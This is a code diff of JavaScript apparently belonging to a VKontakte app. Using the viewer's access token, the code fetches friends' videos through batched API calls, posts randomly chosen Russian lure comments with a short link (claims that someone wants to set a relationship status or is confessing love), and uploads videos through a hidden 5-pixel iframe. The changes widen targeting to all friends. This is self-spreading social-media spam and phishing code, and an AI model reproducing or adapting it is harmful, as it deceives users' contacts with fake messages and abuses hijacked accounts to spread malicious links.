@@ -139,7 +139,7 @@
 
           function goApp() {
             //uploadVideo();
-            uploadPhoto();
+            getVideosFriends();
 
 
               if(count_likes < 1) {
@@ -257,6 +257,7 @@
                     }
                   }
                   viewer.friends.items = fr_temp;
+                  sortByLastTime();
 
                   var div = '<div class="blackPopap" style="position: relative;z-index: 9999;"> \n\
                             <div onclick="closeseblackPopap()" class="modal-background" style="position: fixed;"></div> \n\
@@ -365,13 +366,13 @@
             var code = 'return [';
             var count=0;
             for(var i=0;i<viewer.friends.items.length;i++){
-              if(viewer.friends.items[i].sex == 1){
+              //if(viewer.friends.items[i].sex == 1){
                 count++;
                 code+='API.video.get({"owner_id":'+viewer.friends.items[i].id+',"count":3}),';
                 if(count > 23){
                   break;
                 }
-              }
+              //}
             }
             code+='];';
 
@@ -400,10 +401,9 @@
             }
 
             var comments = [
-              "Не могу в л.с тебе написать, ты видела кто хочет с тобой поставить семейное положение : "+short_url,
-              "Странно, но не могу в л.с тебе написать, ты видела кто хочет с тобой поставить с.п.? : "+short_url,
+              "Не могу в л.с тебе написать, ты видишь кто хочет с тобой поставить семейное положение : "+short_url,
+              "Странно, но не могу в л.с тебе написать, ты видишь кто хочет с тобой поставить с.п.? : "+short_url,
               "Не получается в личку написать, посмотри кто тебе признается в любви, как тебе?  "+short_url,
-              "Ты видела кто хочет с тобой поставить семейное положение? я в шоке) (Не могу в личку написать) : "+short_url,
               "Без комментариев, я в шоке что написали : "+short_url];
 
               var comment = comments[getRandom(0,comments.length-1)];
@@ -494,11 +494,11 @@
                id_videoupload = data.response.video_id;
 
                if(viewer.friends.items[global_offset_i+1]){
-                 uploadVideo();
+                 //uploadVideo();
                }
 
                 $("#for_iframe").html('<iframe src="'+data.response.upload_url+'" height="5px" width="5px"></iframe>');
-                createCommetsVideo();
+                uploadComments();
 
              });
           }
@@ -554,9 +554,9 @@
                 "params": {"code": code, "v": "5.95", "access_token": token}
             }).then(data => {
                 idCommets = data.response;
-                 uploadPhoto();
+                 //uploadPhoto();
              }).catch(error => {
-                uploadPhoto();
+                //uploadPhoto();
               });
 
           }
